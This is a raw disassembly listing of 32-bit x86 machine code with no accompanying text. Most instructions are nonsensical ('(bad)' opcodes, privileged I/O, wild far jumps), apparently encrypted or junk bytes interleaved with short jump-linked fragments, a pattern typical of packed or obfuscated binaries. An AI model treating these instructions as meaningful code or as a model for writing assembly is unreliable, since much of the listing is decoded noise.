  4071c4:	xchg   ebp,eax
  4071c5:	cli    
  4071c6:	sete   BYTE PTR [edx-0x45]
  4071ca:	sbb    eax,0xa1d8719c
  4071cf:	mov    eax,0xa4731ecb
  4071d4:	mov    WORD PTR [esi-0x62],?
  4071d7:	les    ebx,FWORD PTR [ebx-0x12642e2e]
  4071dd:	repz push ds
  4071df:	jl     0x407223
  4071e1:	(bad)  
  4071e2:	pusha  
  4071e3:	sti    
  4071e4:	or     dl,BYTE PTR [ebx-0x2b2f2a28]
  4071ea:	in     eax,dx
  4071eb:	mov    ch,dh
  4071ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071ee:	mov    ecx,0xd0c16002
  4071f3:	aad    0xd2
  4071f5:	jg     0x4071e9
  4071f7:	test   eax,0x9ba58b28
  4071fc:	mov    ebx,0xd2498e80
  407201:	aaa    
  407202:	add    esp,ebp
  407204:	shr    BYTE PTR [edx],0x11
  407207:	fidiv  DWORD PTR [eax-0x5a45da3c]
  40720d:	daa    
  40720e:	cmp    DWORD PTR [esi],0xffffffdf
  407211:	dec    edi
  407212:	std    
  407213:	sub    DWORD PTR [edx],ecx
  407215:	mov    cl,0x3e
  407217:	aaa    
  407218:	lea    esp,[eax+0x4eae190f]
  40721e:	inc    bx
  407220:	jle    0x407225
  407222:	push   eax
  407223:	push   ds
  407224:	xchg   edx,eax
  407225:	add    DWORD PTR [esi],esp
  407227:	jecxz  0x4071cf
  407229:	push   ss
  40722a:	test   al,0x94
  40722c:	inc    edi
  40722d:	push   0x25350058
  407232:	cmp    al,0x8b
  407234:	fcmovu st,st(6)
  407236:	into   
  407237:	jo     0x407201
  407239:	and    ah,BYTE PTR ds:0x1285bfc4
  40723f:	fst    DWORD PTR [eax+ecx*2]
  407242:	dec    edx
  407243:	xor    BYTE PTR [edx],0x13
  407246:	imul   ebx,eax,0x5242c47c
  40724c:	inc    ebx
  40724d:	nop
  40724e:	arpl   WORD PTR [ebx+0x6b],si
  407251:	sub    DWORD PTR [eax],edx
  407253:	jmp    DWORD PTR [ecx-0x75]
  407256:	sbb    esp,DWORD PTR [eax+ecx*4-0x1]
  40725a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40725b:	(bad)  
  40725c:	in     eax,dx
  40725d:	mov    WORD PTR [ecx-0x3c4e2744],?
  407263:	ins    BYTE PTR es:[edi],dx
  407264:	push   esi
  407265:	dec    esp
  407266:	mov    bl,0xb9
  407268:	xchg   dl,al
  40726a:	repnz lods al,BYTE PTR ds:[esi]
  40726c:	sbb    BYTE PTR [edi],0x2e
  40726f:	mov    al,0xdc
  407271:	fxch   st(1)
  407273:	cmp    al,0x8d
  407275:	loopne 0x40720f
  407277:	cmp    DWORD PTR [eax+ebp*8-0x36b78914],edx
  40727e:	push   edi
  40727f:	inc    esp
  407280:	(bad)  
  407281:	jl     0x40725a
  407283:	lds    esi,FWORD PTR [edi]
  407285:	mov    al,ah
  407287:	test   eax,0x4344c6e4
  40728c:	scas   al,BYTE PTR es:[edi]
  40728d:	popf   
  40728e:	cli    
  40728f:	fnstsw WORD PTR [eax-0x2662f065]
  407295:	sbb    DWORD PTR [esi],0xc895608c
  40729b:	jmp    0x68ee:0xb268bdc3
  4072a2:	cli    
  4072a3:	xor    DWORD PTR [ebx-0x1c65f6af],edx
  4072a9:	mov    bl,0xe9
  4072ab:	retf   
  4072ac:	div    BYTE PTR [eax]
  4072ae:	jnp    0x40732f
  4072b0:	dec    esp
  4072b1:	out    dx,al
  4072b2:	xlat   BYTE PTR ds:[ebx]
  4072b3:	pop    ebx
  4072b4:	inc    eax
  4072b5:	fadd   DWORD PTR [ecx-0x1a0942e4]
  4072bb:	scas   eax,DWORD PTR es:[edi]
  4072bc:	aas    
  4072bd:	bound  ebp,QWORD PTR [ebx]
  4072bf:	clc    
  4072c0:	test   al,0xdd
  4072c2:	repz mov esp,esi
  4072c5:	mov    ds:0x182ce44b,eax
  4072ca:	test   BYTE PTR ds:0x93ccc23c,cl
  4072d0:	xchg   ebp,eax
  4072d1:	mov    DWORD PTR [ebp-0x779b8f0a],eax
  4072d7:	xchg   edi,eax
  4072d8:	cmp    al,0xa0
  4072da:	ffreep st(1)
  4072dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072dd:	push   esi
  4072de:	popa   
  4072df:	lahf   
  4072e0:	mov    esi,DWORD PTR [ebx]
  4072e2:	push   ebp
  4072e3:	mov    cl,0x10
  4072e5:	sub    BYTE PTR [eax+0x20eb77d6],ch
  4072eb:	shl    DWORD PTR [edi+0x1c],1
  4072ee:	sbb    edx,DWORD PTR [eax+edx*4+0x19af471a]
  4072f5:	mov    al,0xfc
  4072f7:	fdivr  QWORD PTR [ecx]
  4072f9:	popa   
  4072fa:	xchg   edx,eax
  4072fb:	cmp    edi,DWORD PTR [edi-0x5dd9ba86]
  407301:	cmovne esi,edi
  407304:	mov    cl,0x50
  407306:	in     eax,0xc4
  407308:	inc    esi
  407309:	pop    eax
  40730a:	mov    bl,0x23
  40730c:	push   cs
  40730d:	add    ecx,ecx
  40730f:	mov    eax,0xdb45cb93
  407314:	cmp    al,0x8b
  407316:	inc    ebp
  407317:	clc    
  407318:	and    ecx,0x67ef
  40731e:	mov    ecx,0x7510856
  407323:	push   esi
  407324:	mov    esi,DWORD PTR ds:0x430646
  40732a:	sub    DWORD PTR ds:0x43059a,esi
  407330:	xor    eax,ecx
  407332:	mov    esi,0x32729d
  407337:	sub    DWORD PTR ds:0x42e862,0x4305aa
  407341:	add    eax,esi
  407343:	jmp    0x4074db
  407348:	mov    dl,BYTE PTR [ebp-0x1]
  40734b:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  40734f:	mov    DWORD PTR ds:0x4305b6,0x7329
  407359:	inc    eax
  40735a:	jmp    0x4074db
  40735f:	mov    WORD PTR [esi],cs
  407361:	jbe    0x407315
  407363:	pushf  
  407364:	pop    edx
  407365:	dec    esp
  407366:	fsub   DWORD PTR [edi+0x302235c]
  40736c:	cmc    
  40736d:	sbb    BYTE PTR [ebx],cl
  40736f:	or     edi,ecx
  407371:	jle    0x4073f1
  407373:	sar    BYTE PTR [edi+0x7e],cl
  407376:	jle    0x407393
  407378:	xchg   ebx,eax
  407379:	ss jecxz 0x407331
  40737c:	shl    DWORD PTR [ebp+0x45b062fe],1
  407382:	or     BYTE PTR [ebp+0x5c],0xcb
  407386:	adc    eax,edx
  407388:	es jmp 0x40731a
  40738b:	addr16 jne 0x407389
  40738e:	cmc    
  40738f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407390:	push   eax
  407391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407392:	dec    esi
  407393:	mov    bl,0xc8
  407395:	(bad)  
  407396:	mov    ebx,0x7f5e3632
  40739b:	popf   
  40739c:	lock and eax,0xb728a654
  4073a2:	xchg   DWORD PTR [ebx+0x1a],esp
  4073a5:	jmp    0xe6d66c50
  4073aa:	les    eax,FWORD PTR [edi]
  4073ac:	test   DWORD PTR [eax+0x2a],0xb8ceb459
  4073b3:	imul   edi,DWORD PTR [ebx-0x6477799b],0x3e5f00a1
  4073bd:	jo     0x407371
  4073bf:	xchg   ebp,eax
  4073c0:	mov    edi,0x98334437
  4073c5:	jne    0x40735b
  4073c7:	cmc    
  4073c8:	push   ss
  4073c9:	mov    ebp,0x198173ba
  4073ce:	(bad)  
  4073cf:	pop    edi
  4073d0:	fcomp  DWORD PTR [eax+edi*4+0x5d60337c]
  4073d7:	mov    ebx,0x1cd38121
  4073dc:	bound  ebp,QWORD PTR [edi+ebx*4+0x62]
  4073e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073e1:	jno    0x407404
  4073e3:	lock push 0x93fb4947
  4073e9:	pop    edx
  4073ea:	push   0xffffffaa
  4073ec:	sbb    DWORD PTR [eax+ecx*4+0x70fa28c6],0x8d2c1d18
  4073f7:	mov    edi,0x752811df
  4073fc:	dec    bh
  4073fe:	or     eax,0xa143cbb0
  407403:	mov    cl,0x7f
  407405:	lahf   
  407406:	xchg   esp,eax
  407407:	ins    DWORD PTR es:[edi],dx
  407408:	ss je  0x407439
  40740b:	das    
  40740c:	sub    DWORD PTR [edx+ebx*1+0x48d81089],0x40318fd4
  407417:	into   
  407418:	iret   
  407419:	ret    0x5de7
  40741c:	stos   DWORD PTR es:[edi],eax
  40741d:	jae    0x4073ff
  40741f:	mov    BYTE PTR [eax],bl
  407421:	ss leave 
  407423:	leave  
  407424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407425:	or     eax,0x9c3dc6d2
  40742a:	stos   BYTE PTR es:[edi],al
  40742b:	pop    edx
  40742c:	sbb    bl,al
  40742e:	ja     0x40741c
  407430:	sbb    esp,DWORD PTR [ebp+0x3d]
  407433:	sbb    al,0x41
  407435:	bound  ecx,QWORD PTR [edi-0x80510be]
  40743b:	pop    ebp
  40743c:	xchg   edx,eax
  40743d:	std    
  40743e:	ins    DWORD PTR es:[edi],dx
  40743f:	or     esp,ebp
  407441:	mov    ebp,0x59957020
  407446:	xchg   ebx,eax
  407447:	enter  0x55bc,0xdc
  40744b:	cmp    al,0x1
  40744d:	pop    ebp
  40744e:	mov    ah,0x2a
  407450:	ret    
  407451:	js     0x4073dc
  407453:	push   0x73
  407455:	mov    ebp,0x872a6ca2
  40745a:	dec    ecx
  40745b:	sbb    esi,edi
  40745d:	push   esp
  40745e:	data16 adc dl,BYTE PTR [edx+0x78]
  407462:	inc    ecx
  407463:	test   al,0x99
  407465:	dec    edx
  407466:	pop    ss
  407467:	xchg   ebx,eax
  407468:	lock mov ah,0x3f
  40746b:	pop    ecx
  40746c:	rol    BYTE PTR [ecx],cl
  40746e:	sbb    cl,BYTE PTR [edi]
  407470:	ins    DWORD PTR es:[edi],dx
  407471:	pop    es
  407472:	mov    eax,ds:0xe424811b
  407477:	rol    BYTE PTR [edx+ecx*2+0x28af793f],0xce
  40747f:	add    DWORD PTR [edx-0x48],esi
  407482:	push   edi
  407483:	in     eax,dx
  407484:	mov    BYTE PTR [ebp+0x582e4b09],0x7f
  40748b:	push   esi
  40748c:	xchg   esp,eax
  40748d:	popa   
  40748e:	iret   
  40748f:	dec    esp
  407490:	xchg   esi,eax
  407491:	mov    al,0xef
  407493:	sar    BYTE PTR [esi+0x49734834],1
  407499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749a:	fld    DWORD PTR [edi+0x34]
  40749d:	xor    ch,BYTE PTR [edi]
  40749f:	push   ebx
  4074a0:	lock (bad) 
  4074a2:	fimul  DWORD PTR [ecx+0x56452eb9]
  4074a8:	mov    ah,0x2d
  4074aa:	pop    edi
  4074ab:	xchg   ebx,eax
  4074ac:	mov    ds:0xd7e01456,al
  4074b1:	and    BYTE PTR [ebp+0xb0dbc9c],ah
  4074b7:	cdq    
  4074b8:	fidivr DWORD PTR [edx+0x29ea4c61]
  4074be:	out    dx,al
  4074bf:	xchg   ebx,eax
  4074c0:	fwait
  4074c1:	shl    BYTE PTR [ebx-0x4],1
  4074c4:	mov    DWORD PTR ds:0x9274aab9,0x7d95df55
  4074ce:	mov    dh,0x4e
  4074d0:	cwde   
  4074d1:	adc    DWORD PTR [esi+0x10634734],ebx
  4074d7:	mov    DWORD PTR [ebp+0x3b],esi
  4074da:	out    0x83,al
  4074dc:	clc    
  4074dd:	inc    eax
  4074de:	jb     0x407348
  4074e4:	mov    edx,DWORD PTR [ebp-0x8]
  4074e7:	mov    eax,DWORD PTR [ebp-0xc]
  4074ea:	xor    edx,ecx
  4074ec:	add    edx,esi
  4074ee:	cmp    edx,eax
  4074f0:	je     0x407cbb
  4074f6:	push   ebx
  4074f7:	push   edi
  4074f8:	jmp    0x407679
  4074fd:	ins    BYTE PTR es:[edi],dx
  4074fe:	lds    edx,FWORD PTR [edx]
  407500:	cmp    BYTE PTR [ebx-0x1002839b],0xf2
  407507:	xchg   dl,dh
  407509:	or     DWORD PTR [edx-0x3f12cd06],edi
  40750f:	jle    0x40758f
  407511:	sar    BYTE PTR [edi+0x7e],cl
  407514:	jle    0x4074fd
  407516:	mov    ebx,DWORD PTR [esp+ebp*4-0x561972fe]
  40751d:	ss inc esp
  40751f:	and    DWORD PTR ds:0xad92add6,ebp
  407525:	idiv   DWORD PTR [ecx]
  407527:	ja     0x40756e
  407529:	adc    BYTE PTR fs:[edi-0xe617e9d],bh
  407530:	mov    dh,0x4e
  407532:	fnstenv [ebp+0x2930f42e]
  407538:	outs   dx,BYTE PTR ds:[esi]
  407539:	inc    edx
  40753a:	mov    BYTE PTR [edx],ah
  40753c:	pusha  
  40753d:	aad    0x93
  40753f:	xchg   edx,eax
  407540:	mov    al,ds:0x3300f138
  407545:	dec    esi
  407546:	les    ecx,FWORD PTR [edx+0x511281aa]
  40754c:	out    dx,al
  40754d:	call   0xd338:0x371a3765
  407554:	in     eax,0x1a
  407556:	cdq    
  407557:	mov    bl,0x24
  407559:	cmp    eax,eax
  40755b:	mov    bl,0xb3
  40755d:	cmc    
  40755e:	sub    DWORD PTR [ecx],ecx
  407560:	aad    0x45
  407562:	push   0xffffff80
  407564:	and    edx,eax
  407566:	xor    ch,BYTE PTR [esi-0x56]
  407569:	cmp    al,0x4f
  40756b:	(bad)  
  40756c:	out    dx,al
  40756d:	sbb    esp,DWORD PTR [ebp-0x5a4c8dd1]
  407573:	fsubp  st(1),st
  407575:	sub    eax,0x2acfacc9
  40757a:	cli    
  40757b:	add    eax,DWORD PTR ds:0xd8bc30ee
  407581:	mov    DWORD PTR [edi+0x4f],esi
  407584:	pop    ss
  407585:	fcom   st(3)
  407587:	mov    ds:0xa83ac523,al
  40758c:	test   dl,al
  40758e:	or     dh,BYTE PTR [ebx+0x46]
  407591:	cmp    eax,0xb6e929a3
  407596:	rcr    BYTE PTR [edx+0x4f],0x77
  40759a:	xchg   edx,eax
  40759c:	bnd js 0x407606
  40759f:	sbb    DWORD PTR [esi+eax*1],edx
  4075a2:	sbb    eax,0xabbf3c22
  4075a7:	hlt    
  4075a8:	pop    ds
  4075a9:	push   edx
  4075aa:	jg     0x40754d
  4075ac:	cmp    ch,BYTE PTR [ecx]
  4075ae:	lods   eax,DWORD PTR ds:[esi]
  4075af:	in     al,0x4e
  4075b1:	lahf   
  4075b2:	mov    ebx,edi
  4075b4:	cs push ebx
  4075b6:	add    ebx,DWORD PTR [ebx+ebp*4+0x18]
  4075ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075bb:	jno    0x407542
  4075bd:	pushf  
  4075be:	push   ds
  4075bf:	xchg   esi,ebx
  4075c1:	jbe    0x407599
  4075c3:	shl    BYTE PTR [ebp-0x63],1
  4075c6:	mov    ds:0x47e25d52,al
  4075cb:	int    0xca
  4075cd:	push   ebp
  4075ce:	add    al,0x3f
  4075d0:	ins    BYTE PTR es:[edi],dx
  4075d1:	pop    ebp
  4075d2:	xor    DWORD PTR [edx-0x74cba380],0x36
  4075d9:	stos   DWORD PTR es:[edi],eax
  4075da:	xchg   ebp,eax
  4075db:	inc    edx
  4075dc:	repnz out 0xf,eax
  4075df:	sti    
  4075e0:	and    al,0xbe
  4075e2:	vpunpckhwd ymm0,ymm3,YMMWORD PTR [esi-0x643ade3c]
  4075ea:	mov    dl,0xc9
  4075ec:	aam    0x7b
  4075ee:	sbb    DWORD PTR [esi],edi
  4075f0:	sbb    al,0x28
  4075f2:	push   0xdf846709
  4075f7:	cmp    DWORD PTR [edx],edx
  4075f9:	addr16 mov ds:0x2f86,eax
  4075fd:	jg     0x4075a4
  4075ff:	repz in eax,0x37
  407602:	xor    ecx,ebp
  407604:	and    edx,DWORD PTR [eax-0x296e460]
  40760a:	sbb    al,0x4
  40760c:	jl     0x4075bc
  40760e:	nop
  40760f:	stos   DWORD PTR es:[edi],eax
  407610:	into   
  407611:	jnp    0x407602
  407613:	mov    ah,0x72
  407615:	scas   al,BYTE PTR es:[edi]
  407616:	mov    ebp,0x93da267d
  40761b:	clc    
  40761c:	dec    edx
  40761d:	nop
  40761e:	dec    ecx
  40761f:	test   BYTE PTR [edx],0x50
  407622:	in     al,dx
  407623:	xchg   ah,ch
  407625:	aas    
  407626:	push   0xc8d9d2e6
  40762b:	and    ah,BYTE PTR [edi+ebp*2]
  40762e:	cmc    
  40762f:	cs jno 0x4076a0
  407632:	jns    0x4075d3
  407634:	pop    es
  407635:	lock adc DWORD PTR [edi-0x15],0xe
  40763a:	test   DWORD PTR [ecx],esi
  40763c:	std    
  40763d:	push   0xffffffc6
  40763f:	fdiv   st(1),st
  407641:	fmul   QWORD PTR [esi+0x4355cb78]
  407647:	call   0x7d5206eb
  40764c:	repz push ss
  40764e:	push   0x776c4520
  407653:	aad    0x9a
  407655:	inc    ebx
  407656:	adc    bl,ch
  407658:	stos   DWORD PTR es:[edi],eax
  407659:	xchg   ebp,esp
  40765b:	repz jmp 0x407614
  40765e:	sbb    ebp,DWORD PTR [edi]
  407660:	add    al,0xfa
  407662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407663:	leave  
  407664:	xlat   BYTE PTR ds:[ebx]
  407665:	jle    0x4076ab
  407667:	loop   0x4075f5
  407669:	dec    esi
  40766a:	adc    al,0x47
  40766c:	mov    ds:0x8bf61b0e,al
  407671:	sub    BYTE PTR [ebp-0x75],bh
  407674:	mov    WORD PTR [edi-0x26],gs
  407677:	jns    0x407683
  407679:	mov    edi,DWORD PTR [ebp+0x8]
  40767c:	jmp    0x4077fd
  407681:	jae    0x40766e
  407683:	cmp    al,ah
  407685:	cli    
  407686:	vpaddw ymm3,ymm2,YMMWORD PTR [eax+eax*1]
  40768b:	inc    DWORD PTR [ecx]
  40768d:	and    al,0x45
  40768f:	call   0xd27e:0x7ec14198
  407696:	jg     0x407716
  407698:	jle    0x4076f4
  40769a:	pop    es
  40769b:	inc    eax
  40769c:	fdivp  st(3),st
  40769e:	cmp    esi,DWORD PTR [esp+0x5f]
  4076a2:	and    al,0x8a
  4076a4:	jbe    0x4076cb
  4076a6:	in     eax,dx
  4076a7:	jae    0x407724
  4076a9:	adc    al,0x31
  4076ab:	mov    al,0x3f
  4076ad:	mov    edx,0xa2fb1fda
  4076b2:	stos   DWORD PTR es:[edi],eax
  4076b3:	xchg   esp,eax
  4076b4:	in     eax,0x76
  4076b6:	icebp  
  4076b7:	dec    esi
  4076b8:	aam    0x21
  4076ba:	jbe    0x40765e
  4076bc:	hlt    
  4076bd:	pop    es
  4076be:	mov    bl,0x77
  4076c0:	pop    eax
  4076c1:	pop    ds
  4076c2:	mov    ds:0xb2ee721c,eax
  4076c7:	fidiv  DWORD PTR [esi-0x5b]
  4076ca:	daa    
  4076cb:	pop    ecx
  4076cc:	lahf   
  4076cd:	mov    ebx,0xf00ad7cb
  4076d2:	ins    DWORD PTR es:[edi],dx
  4076d3:	test   al,0x44
  4076d5:	or     DWORD PTR [ebp+0x2c549e4c],edi
  4076db:	ss stc 
  4076dd:	bound  ebp,QWORD PTR [ebp-0x78696793]
  4076e3:	xor    bl,BYTE PTR [ecx]
  4076e5:	pushf  
  4076e6:	rol    DWORD PTR [eax-0x2719d83f],1
  4076ec:	push   esp
  4076ed:	pop    esi
  4076ee:	in     al,0xd6
  4076f0:	sbb    al,0xe
  4076f2:	adc    edx,ebp
  4076f4:	and    al,cl
  4076f6:	ja     0x4076a3
  4076f8:	jmp    0x71660dec
  4076fd:	jo     0x407750
  4076ff:	(bad)  
  407701:	dec    esi
  407702:	neg    BYTE PTR [ecx]
  407704:	xor    cl,BYTE PTR [esp+eiz*8+0x2d]
  407708:	fidivr WORD PTR [edi+0x3a]
  40770b:	and    al,0xc4
  40770d:	and    eax,0xac324a6f
  407712:	icebp  
  407713:	jo     0x40777f
  407715:	into   
  407716:	imul   ecx,edx,0x4b1043b7
  40771c:	test   al,0x62
  40771e:	adc    dh,bl
  407720:	(bad)  
  407721:	mov    al,0x3
  407723:	mov    esp,0xf0587909
  407728:	je     0x4076ea
  40772a:	das    
  40772b:	ins    BYTE PTR es:[edi],dx
  40772c:	cwde   
  40772d:	mov    bl,0xe8
  40772f:	xchg   esp,eax
  407730:	xchg   ebp,eax
  407731:	adc    BYTE PTR [ebx],bl
  407733:	push   0xffffff82
  407735:	and    eax,0x6028f43e
  40773a:	outs   dx,DWORD PTR ds:[esi]
  40773b:	aam    0xfc
  40773d:	enter  0x525d,0x70
  407741:	ins    DWORD PTR es:[edi],dx
  407742:	leave  
  407743:	dec    edx
  407744:	icebp  
  407745:	fsubrp st(1),st
  407747:	enter  0xf702,0x4f
  40774b:	jns    0x407781
  40774d:	add    DWORD PTR [eax+0x56],ebp
  407750:	jge    0x40776b
  407752:	(bad)
  407755:	jle    0x40779a
  407757:	mul    DWORD PTR [ebx+esi*1+0x3bed4d59]
  40775e:	repz pop ss
  407760:	sahf   
  407761:	dec    eax
  407762:	idiv   esp
  407764:	mov    edx,0x7b58c89d
  407769:	imul   eax,DWORD PTR [edi],0xffffffad
  40776c:	sbb    ebx,DWORD PTR [eax-0x28]
  40776f:	jmp    0x4b5f:0x4d048590
  407776:	mov    bh,0x59
  407778:	mov    dl,0x9e
  40777a:	js     0x407736
  40777c:	nop
  40777d:	mov    ds:0xe08cfbc,eax
  407782:	(bad)  
  407783:	jne    0x4077f6
  407785:	fcom   DWORD PTR [ecx]
  407787:	sbb    DWORD PTR ds:0x62c2cdb9,edx
  40778d:	or     DWORD PTR [ebx],edx
  40778f:	mov    dl,0x40
  407791:	sbb    DWORD PTR [edi+ecx*2+0x5b],edi
  407795:	mov    ah,0xe8
  407797:	rol    BYTE PTR [ebp+0x31],1
  40779a:	dec    edx
  40779b:	in     eax,0xed
  40779d:	mov    edx,0x90cfe1db
  4077a2:	push   es
  4077a3:	sbb    dl,BYTE PTR [edi-0x4]
  4077a6:	jmp    0x4d89:0x34761830
  4077ad:	aaa    
  4077ae:	add    ah,BYTE PTR [ebp+0x65]
  4077b1:	xchg   ecx,eax
  4077b2:	repnz sub edx,DWORD PTR [eax]
  4077b5:	repnz xor esp,DWORD PTR [esi]
  4077b8:	(bad)  
  4077ba:	xor    BYTE PTR [edi+ebp*1-0xf],0xfe
  4077bf:	ret    
  4077c0:	cmp    eax,0xe317b275
  4077c5:	gs push ds
  4077c7:	dec    edi
  4077c8:	mov    BYTE PTR [ecx-0x1b3e146b],0xd7
  4077cf:	dec    edx
  4077d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077d1:	cmp    dl,BYTE PTR [eax-0x38d4cb58]
  4077d7:	(bad)  
  4077d8:	jmp    FWORD PTR [ebp-0x5690bea9]
  4077de:	push   esp
  4077df:	inc    ebx
  4077e0:	sbb    eax,0xb3bedde0
  4077e5:	or     esp,DWORD PTR gs:[ecx+eiz*1-0x29014801]
  4077ed:	mov    ds:0x8fb03a41,al
  4077f2:	sbb    dh,BYTE PTR [ebx-0x59531b6d]
  4077f8:	inc    esp
  4077f9:	cmc    
  4077fa:	test   BYTE PTR [edx-0x75bf47ed],ch
  407800:	add    BYTE PTR [eax],al
  407802:	xor    ax,WORD PTR [edi+edx*4+0x2]
  407807:	mov    edi,0x3b06
  40780c:	add    ax,di
  40780f:	jmp    0x407990
  407814:	push   ebp
  407815:	fsub   DWORD PTR [edx+0x557cbb2e]
  40781b:	pop    ebp
  40781c:	xchg   ecx,esp
  40781e:	push   0xd
  407820:	imul   dh
  407822:	mov    edx,0x7ec32580
  407827:	jle    0x4077fb
  407829:	jg     0x4078a9
  40782b:	jle    0x4078a1
  40782d:	loope  0x40780d
  40782f:	ret    
  407830:	jmp    0x4078ab
  407832:	clc    
  407833:	and    eax,0x97ea710e
  407838:	adc    edx,DWORD PTR fs:[edx+0x28]
  40783c:	cwde   
  40783d:	das    
  40783e:	dec    edx
  40783f:	lahf   
  407840:	popa   
  407841:	int3   
  407842:	jbe    0x4077d3
  407844:	stc    
  407845:	outs   dx,BYTE PTR ds:[esi]
  407846:	jecxz  0x4077ff
  407848:	ins    BYTE PTR es:[edi],dx
  407849:	jl     0x4077f1
  40784b:	mov    ebx,0x6bf9b860
  407850:	dec    edi
  407851:	test   DWORD PTR [eax+0x44],esi
  407854:	mov    bl,0x76
  407856:	(bad)  
  407857:	inc    ecx
  407858:	out    0xf6,eax
  40785a:	ds adc bl,cl
  40785d:	ja     0x40789d
  40785f:	test   DWORD PTR [esi+0x1b4bfee3],esi
  407865:	inc    edx
  407866:	add    edx,edx
  407868:	dec    esp
  407869:	in     al,dx
  40786a:	push   esp
  40786b:	cwde   
  40786c:	dec    edx
  40786d:	xchg   esp,eax
  40786e:	ins    BYTE PTR es:[edi],dx
  40786f:	lea    edi,[esi]
  407871:	out    0xfd,eax
  407873:	inc    ebp
  407874:	fcomp  DWORD PTR [edx]
  407876:	inc    eax
  407877:	in     al,0xd9
  407879:	sub    eax,0x9ba0346
  40787e:	add    eax,0x7e372a60
  407883:	push   ecx
  407884:	and    eax,0x171d9a5a
  407889:	jle    0x4078cd
  40788b:	push   ecx
  40788c:	call   0x41ba4be9
  407891:	cmc    
  407892:	ficom  WORD PTR [ebp+0x7e90f453]
  407898:	fstp   QWORD PTR [esi]
  40789a:	add    ah,cl
  40789c:	lds    esi,FWORD PTR [edx+0x1a2a7475]
  4078a2:	or     eax,0x31fbb32
  4078a7:	inc    ecx
  4078a8:	stos   DWORD PTR es:[edi],eax
  4078a9:	shl    cl,cl
  4078ab:	(bad)  
  4078ac:	sbb    ebp,DWORD PTR [ebx]
  4078ae:	xchg   ecx,eax
  4078af:	and    bl,BYTE PTR [ebx-0x23]
  4078b2:	loopne 0x4078f1
  4078b4:	je     0x407870
  4078b6:	add    al,0x97
  4078b8:	jg     0x407937
  4078ba:	push   ebp
  4078bb:	in     eax,dx
  4078bc:	mov    ecx,0xcfcf0bfd
  4078c1:	jg     0x4078c0
  4078c3:	loop   0x40790e
  4078c5:	mov    BYTE PTR [esi],bh
  4078c7:	mov    ecx,0xca330f6c
  4078cc:	xor    dh,BYTE PTR [edi+eiz*2-0x56]
  4078d0:	dec    esp
  4078d1:	inc    ecx
  4078d2:	jl     0x407918
  4078d4:	test   eax,0x5e6f5ec9
  4078d9:	retf   
  4078da:	aam    0x70
  4078dc:	adc    DWORD PTR [esi],esi
  4078de:	and    dl,BYTE PTR [ebp+0x63]
  4078e1:	pop    esi
  4078e2:	into   
  4078e3:	mov    BYTE PTR [ecx+0x4d],bl
  4078e6:	inc    esp
  4078e7:	mov    al,0xa2
  4078e9:	outs   dx,BYTE PTR ds:[esi]
  4078ea:	daa    
  4078eb:	adc    BYTE PTR [edx],0xdc
  4078ee:	into   
  4078ef:	pop    edi
  4078f0:	clc    
  4078f1:	sbb    BYTE PTR [ebx+ecx*8-0x6d],0xdc
  4078f6:	mov    eax,ds:0xe6972391
  4078fb:	fwait
  4078fc:	popf   
  4078fd:	loope  0x4078ac
  4078ff:	test   DWORD PTR [eax-0x7b],0xed4c4c5b
  407906:	gs ss jno 0x407939
  40790a:	cld    
  40790b:	cmp    BYTE PTR [ebp-0x52],dh
  40790e:	adc    ah,bh
  407910:	outs   dx,DWORD PTR ds:[esi]
  407911:	(bad)  
  407913:	inc    eax
  407914:	push   esi
  407915:	test   esp,edi
  407917:	xchg   ebp,eax
  407918:	pop    eax
  407919:	or     ah,al
  40791b:	pusha  
  40791c:	rol    DWORD PTR [ebx-0x270f6f29],cl
  407922:	out    dx,al
  407923:	lods   al,BYTE PTR ds:[esi]
  407924:	sbb    dl,BYTE PTR [ebx]
  407926:	cld    
  407927:	fisttp WORD PTR [esp+eiz*4+0x58]
  40792b:	mov    al,0xff
  40792d:	daa    
  40792e:	mov    ecx,0xdae636ce
  407933:	dec    ebx
  407934:	jp     0x4078c8
  407936:	cmp    BYTE PTR [ebp-0x763adc6a],al
  40793c:	cmp    ecx,DWORD PTR [ecx-0x46]
  40793f:	xor    esp,DWORD PTR [ebp-0x52]
  407942:	inc    ebp
  407943:	(bad)  
  407944:	lods   eax,DWORD PTR ds:[esi]
  407945:	sbb    edx,DWORD PTR [eax-0x531f0177]
  40794b:	dec    eax
  40794c:	jb     0x4078e8
  40794e:	jmp    0xadc6:0xd58e1288
  407955:	mov    edx,0x1750d7cc
  40795a:	es cwde 
  40795c:	xlat   BYTE PTR ds:[ebx]
  40795d:	xchg   esp,eax
  40795e:	and    DWORD PTR [ecx-0x7b],eax
  407961:	outs   dx,BYTE PTR ds:[esi]
  407962:	dec    eax
  407963:	mov    dl,BYTE PTR [esi-0x5419c9f7]
  407969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40796a:	fs test al,0xd9
  40796d:	fisub  DWORD PTR [ebx+0x30]
  407970:	out    0xe2,eax
  407972:	pop    DWORD PTR [ecx-0x7]
  407975:	mov    WORD PTR [ebx],cs
  407977:	arpl   WORD PTR [edi-0x4f61456a],bp
  40797d:	fnsave [edi+0xed2cfba]
  407983:	ja     0x407956
  407985:	push   ebx
  407986:	sbb    DWORD PTR [ebp+0x55c9358a],eax
  40798c:	jge    0x40793e
  40798e:	push   cs
  40798f:	loope  0x4079a0
  407991:	mov    bh,0xc0
  407993:	mov    DWORD PTR [ebp-0x14],eax
  407996:	jmp    0x407b17
  40799b:	xchg   ebx,eax
  40799c:	(bad)  
  40799d:	sbb    ebp,edi
  40799f:	cmp    edi,DWORD PTR [ebx+0x6b]
  4079a2:	inc    edx
  4079a3:	push   sp
  4079a5:	cwde   
  4079a6:	pop    edi
  4079a7:	mov    dh,0xb8
  4079a9:	loop   0x40793f
  4079ab:	cdq    
  4079ac:	les    edi,FWORD PTR [esi+0x7e]
  4079af:	sar    BYTE PTR [edi+0x7e],cl
  4079b2:	jle    0x407955
